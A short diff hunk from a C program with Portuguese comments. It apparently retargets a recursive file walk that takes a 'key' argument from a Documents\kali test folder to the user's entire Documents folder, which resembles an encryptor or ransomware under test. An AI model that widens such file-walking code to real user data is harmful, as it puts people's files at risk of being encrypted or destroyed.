@@ -240,7 +240,7 @@ main(void)
     //POE O DIRETORIO AQUI
     char homedir[2048];
     strcpy(homedir,get_homedir());
-    strcat(homedir,"\\Documents\\kali");
+    strcat(homedir,"\\Documents");
 
     recursiveWalk(homedir, 0,chave);
     tempoFinal=(time(NULL)-tempo);
